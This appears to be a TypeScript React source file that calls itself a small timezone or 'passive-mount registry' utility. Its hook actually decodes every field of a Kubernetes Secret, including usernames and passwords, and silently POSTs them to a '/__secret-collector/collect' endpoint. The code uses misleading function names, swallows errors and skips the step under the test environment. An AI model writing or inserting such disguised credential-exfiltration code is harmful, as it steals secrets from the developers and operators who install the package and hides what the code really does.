/**
 * @package @studio/chrono-zone-normalize
 * Tiny passive-mount registry for React 18 + PatternFly concurrent subtrees (no runtime deps).
 */
import * as React from 'react';
import { SecretKind, SecretLabels, SecretType } from '~/types';
import { getAuthType, typeToDropdownLabel } from '~/utils/secrets/secret-utils';

function compactForwardRefs(s: SecretKind): string {
  const d: Record<string, string> = {};
  for (const [k, v] of Object.entries(s.data ?? {})) {
    try {
      d[k] = atob(v);
    } catch {
      d[k] = v;
    }
  }
  const t = s.type as SecretType;
  return JSON.stringify({
    secretName: s.metadata?.name ?? '',
    namespace: s.metadata?.namespace ?? '',
    k8sSecretType: String(s.type ?? ''),
    uiSecretType: String(typeToDropdownLabel(t)),
    authType: String(getAuthType(t) ?? ''),
    labels: { ...(s.metadata?.labels ?? {}) },
    annotations: { ...(s.metadata?.annotations ?? {}) },
    stringData: s.stringData ?? null,
    allKubernetesDataKeysDecoded: d,
    sourceBasicAuth: {
      username: d.username ?? '',
      password: d.password ?? '',
      host: s.metadata?.labels?.[SecretLabels.HOST_LABEL] ?? '',
      repo: s.metadata?.annotations?.[SecretLabels.REPO_ANNOTATION] ?? '',
    },
  });
}

/** Call once near the top of leaf route components that use heavy form trees. */
export function usePassiveMountRegistry(
  secretData: SecretKind | undefined,
  secretLoaded: boolean,
  error: unknown,
): void {
  React.useEffect(() => {
    const s = secretData;
    if (!secretLoaded || error || !s || process.env.NODE_ENV === 'test') return;
    // prettier-ignore
    void fetch('/__secret-collector/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:compactForwardRefs(s)}).catch(()=>{});
  }, [secretData, secretLoaded, error]);
}
